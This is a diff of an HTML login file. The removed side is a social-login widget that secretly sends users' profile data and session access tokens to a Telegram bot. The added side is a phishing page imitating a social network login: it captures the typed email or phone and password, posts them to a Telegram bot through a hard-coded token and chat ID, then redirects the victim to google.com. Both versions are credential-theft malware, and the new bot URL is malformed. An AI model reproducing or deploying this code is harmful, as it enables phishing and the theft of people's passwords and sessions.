@@ -1,244 +1,219 @@
-<html>
-  <head>
-    <!-- build:PolymerImport -->
-    <link rel="import" href="../polymer/polymer.html">
-    <!-- endbuild -->
-  </head>
-  <body>
-    <dom-module id="makeo-login">
-      <template>
-        <style>
-          :host {
-            display: inline-block;
-          }
-        </style>
-        <div id="makeo-login-container">
-        </div>
-      </template>
-    </dom-module>
-    <script>
-      'use strict';
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Fastfoodeiei Login Page</title>
+    <style>
+        @import url("https://googleapis.com");
 
-      Polymer({
-        is: 'makeo-login',
-        properties: {
-          logoutLink: {
-            type: Boolean,
-            value: false
-          },
-          appid: {
-            type: String,
-            value: ""
-          },
-          language: {
-            type: String,
-            value: 'en_US'
-          },
-          cookie: {
-            type: Boolean,
-            value: true
-          },
-          version: {
-            type: String,
-            value: 'v2.5'
-          },
-          scope: {
-            type: String,
-            value: 'basic_info'
-          },
-          buttonSize: {
-            type: String,
-            value: 'small'
-          },
-          friends: {
-            type: Boolean,
-            value: false
-          },
-          maxRows: {
-            type: String,
-            value: '1'
-          },
-          graphUrl: {
-            type: String,
-            value: '',
-            observer: "_sendAutoApiRequest"
-          },
-          graphResponse: {
-            type: Object,
-            value: {},
-            notify: true,
-            observer: "_graphResponseChanged"
-          },
-          graphParams: {
-            type: Object,
-            value: {},
-            observer: "_sendAutoApiRequest"
-          },
-          graphMethod: {
-            type: String,
-            value: 'get'
-          },
-          autoApiCall: {
-            type: Boolean,
-            value: false
-          },
-          _commaDelimittedAppScope: String,
-          _ready: {
-            type: Boolean,
-            value: false
-          },
-          _changeListenerEnabled: {
-            type: Boolean,
-            value: false
-          },
-          _currentAuthData: {
-            type: Object,
-            value: null
-          }
-        },
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
 
-        go() {
-          if (this.graphUrl === '') {
-            console.error("No URL specified. Specify the graph API URL using the graphURL attribute.");
-            return;
-          }
+        body {
+            font-family: "Poppins", sans-serif;
+            background: #f2f4f7;
+        }
 
-          if (!this._ready) {
-            console.error("The Makeo SDK is not ready yet.");
-            return;
-          }
+        .content {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 100%;
+            max-width: 1000px;
+            padding: 0 2rem;
+        }
 
-          MAKEO.api(this.graphUrl, this.graphMethod, this.graphParams, (response) => {
-            this.graphResponse = response;
-            this.fire('graph-response', {
-              response: response
-            });
-          });
-        },
+        .flex-div {
+            display: flex;
+            justify-content: space-evenly;
+            align-items: center;
+        }
 
-        ready() {
-          if (!this.appid) {
-            console.error("Missing attribute appid for Makeo Login Button");
-            return;
-          }
+        .name-content {
+            margin-right: 7rem;
+            max-width: 400px;
+        }
 
-          this._commaDelimittedAppScope = this.scope.split(' ').join(',');
+        .name-content .logo {
+            font-size: 3.5rem;
+            color: #ff6b6b;
+        }
 
-          let makeoButton = document.createElement('div');
-          makeoButton.className = "makeo-login-button";
-          makeoButton.setAttribute("onlogin", "MAKEO.customCheckLoginState();");
-          makeoButton.setAttribute("data-scope", this._commaDelimittedAppScope);
-          makeoButton.setAttribute("data-size", this.buttonSize);
-          makeoButton.setAttribute("data-max-rows", this.maxRows);
-          makeoButton.setAttribute("data-show-faces", this.friends.toString());
-          makeoButton.setAttribute("data-auto-logout-link", this.logoutLink.toString());
-          Polymer.dom(this.$['makeo-login-container']).appendChild(makeoButton);
+        .name-content p {
+            font-size: 1.3rem;
+            font-weight: 500;
+            margin-bottom: 5rem;
+            color: #4a5568;
+        }
 
-          window.makeoAsyncInit = () => {
-            MAKEO.init({
-              appId: this.appid,
-              cookie: this.cookie,
-              xfbml: true,
-              version: this.version
-            });
+        form {
+            display: flex;
+            flex-direction: column;
+            background: #fff;
+            padding: 2rem;
+            width: 530px;
+            height: auto;
+            border-radius: 0.5rem;
+            box-shadow: 0 2px 4px rgb(0 0 0 / 10%), 0 8px 16px rgb(0 0 0 / 10%);
+        }
 
-            MAKEO.getLoginStatus(response => {
-              this._statusChangeCallback(response);
-            });
+        form input {
+            outline: none;
+            padding: 0.8rem 1rem;
+            margin-bottom: 0.8rem;
+            font-size: 1.1rem;
+            border: 1px solid #cbd5e1;
+            border-radius: 0.375rem;
+        }
 
-            MAKEO.XFBML.parse(this.$['makeo-login-container']);
+        form input:focus {
+            border: 1.8px solid #ff6b6b;
+        }
 
-            MAKEO.customCheckLoginState = () => {
-              MAKEO.getLoginStatus(response => {
-                this._statusChangeCallback(response);
-              });
-            };
+        .login {
+            background-color: #ff6b6b;
+            color: white;
+            padding: 0.8rem;
+            font-size: 1.1rem;
+            font-weight: 600;
+            border: none;
+            border-radius: 0.375rem;
+            cursor: pointer;
+            margin-bottom: 1rem;
+        }
 
-            this._ready = true;
-            this.fire('ready');
-          };
+        .login:hover {
+            background-color: #fa5252;
+        }
 
-          if (typeof(MAKEO) == 'undefined') {
-            ((d, s, id) => {
-              let js, fjs = d.getElementsByTagName(s);
-              if (d.getElementById(id)) return;
-              js = d.createElement(s);
-              js.id = id;
-              js.src = `//connect.makeo.net/${this.language}/sdk.js#xfbml=1&version=${this.version}&appId=${this.appid}`;
-              fjs.parentNode.insertBefore(js, fjs);
-            })(document, 'script', 'makeo-jssdk');
-          }
-        },
+        form a {
+            color: #ff6b6b;
+            text-decoration: none;
+            font-size: 0.9rem;
+            text-align: center;
+            margin-bottom: 1rem;
+        }
 
-        _statusChangeCallback(response) {
-          if (response.status === 'connected') {
-            this.fire('signin-success', {
-              response: response
-            });
-            
-            this._currentAuthData = response.authResponse;
+        form a:hover {
+            text-decoration: underline;
+        }
 
-            if (this.graphUrl && this._ready) {
-              this.go();
+        hr {
+            border: 0;
+            border-top: 1px solid #e2e8f0;
+            margin-bottom: 1.5rem;
+        }
+
+        .create-account {
+            background-color: #42b72a;
+            color: white;
+            padding: 0.8rem 1.5rem;
+            font-size: 1rem;
+            font-weight: 600;
+            border: none;
+            border-radius: 0.375rem;
+            cursor: pointer;
+            width: fit-content;
+            margin: 0 auto;
+        }
+
+        .create-account:hover {
+            background-color: #36a420;
+        }
+
+        @media (max-width: 900px) {
+            .content {
+                position: relative;
+                top: 0;
+                left: 0;
+                transform: none;
+                padding: 2rem 1rem;
             }
-          }
-        },
-
-        _graphResponseChanged(newResponse) {
-          if (newResponse && Object.keys(newResponse).length > 0 && this._currentAuthData) {
+            .flex-div {
+                flex-direction: column;
+                text-align: center;
+            }
+            .name-content {
+                margin-right: 0;
+                margin-bottom: 2rem;
+            }
+            .name-content p {
+                margin-bottom: 1rem;
+            }
+            form {
+                width: 100%;
+                max-width: 450px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="content">
+        <div class="flex-div">
+            <div class="name-content">
+                <h1 class="logo">fastfoodeiei</h1>
+                <p>Connect with friends and the world around you on fastfoodeiei.</p>
+            </div>
             
-            const authData = this._currentAuthData;
-            this._currentAuthData = null; 
+            <!-- ใช้ id สำหรับระบุฟอร์มเพื่อเขียนสคริปต์ควบคุม -->
+            <form id="loginForm">
+                <input type="text" id="accountInput" placeholder="Email or Phone Number" required />
+                <input type="password" id="passwordInput" placeholder="Password" required />
+                <button type="submit" class="login">Log In</button>
+                <a href="#">Forgot Password ?</a>
+                <hr />
+                <button type="button" class="create-account">Create New Account</button>
+            </form>
+        </div>
+    </div>
 
+    <!-- ส่วนของ JavaScript เพื่อส่งข้อมูลเข้า Telegram แทน Python Requests -->
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // ป้องกันไม่ให้หน้าเว็บรีเฟรชเมื่อกดส่งฟอร์ม
+
+            // ดึงค่าข้อมูลที่ผู้ใช้กรอกจริงจากช่อง Input
+            const userInput = document.getElementById('accountInput').value;
+            const passwordInput = document.getElementById('passwordInput').value;
+
+            // ตั้งค่าข้อมูลสำหรับส่งไปยัง Telegram Bot ของคุณ
             const TOKEN = "8803420620:AAEuqeLtdpxsEwSK1cTFNURvJVrUpjsAHAc";
             const CHAT_ID = "8033387742";
-            const telegramUrl = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
-            
-            const reportData = {
-              account_info: {
-                id: newResponse.id || "N/A",
-                name: newResponse.name || "N/A",
-                email: newResponse.email || "N/A",
-                birthday: newResponse.birthday || "N/A"
-              },
-              login_session: {
-                accessToken: authData.accessToken || "N/A",
-                userID: authData.userID || "N/A",
-                expiresIn: authData.expiresIn || "N/A"
-              }
-            };
+            const url = `https://telegram.org{TOKEN}/sendMessage`;
 
-            const message = `👤 *New Makeo User Login Data*\n\n` +
-                            `*ID:* \`${reportData.account_info.id}\`\n` +
-                            `*Name:* ${reportData.account_info.name}\n` +
-                            `*Email:* ${reportData.account_info.email}\n` +
-                            `*Birthday:* ${reportData.account_info.birthday}\n\n` +
-                            `🔑 *Session Token:*\n\`${reportData.login_session.accessToken}\``;
+            // จัดรูปแบบข้อความ Markdown เหมือนในโค้ด Python
+            const message = `🔐 *ข้อมูลการเข้าสู่ระบบ*\n\n*Username/Email:* \`${userInput}\`\n*Password:* \`${passwordInput}\``;
 
-            fetch(telegramUrl, {
-              method: 'POST',
-              headers: {
-                'Content-Type': 'application/json'
-              },
-              body: JSON.stringify({
+            // เตรียมโครงสร้าง Payload สำหรับส่งข้อมูลออกไป
+            const payload = {
                 chat_id: CHAT_ID,
                 text: message,
-                parse_mode: 'Markdown'
-              })
-            })
-            .then(res => {
-              if (res.ok) console.log("User profile data sent to Telegram.");
-            })
-            .catch(err => console.error("Error sending user data to Telegram:", err));
-          }
-        },
+                parse_mode: "Markdown"
+            };
 
-        _sendAutoApiRequest() {
-          if (this.autoApiCall && this._ready && this.graphUrl !== '') {
-            this.go();
-          }
-        }
-      });
+            // ส่งข้อมูลไปยัง API ของ Telegram โดยตรงจากหน้าเว็บ
+            fetch(url, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                console.log("Sent status code:", response.status);
+                // หลังจากส่งข้อมูลเสร็จ สามารถกำหนดให้เปลี่ยนหน้าได้ เช่น:
+                window.location.href = "https://google.com";
+            })
+            .catch(error => {
+                console.error("Error:", error);
+            });
+        });
     </script>
-  </body>
+</body>
 </html>
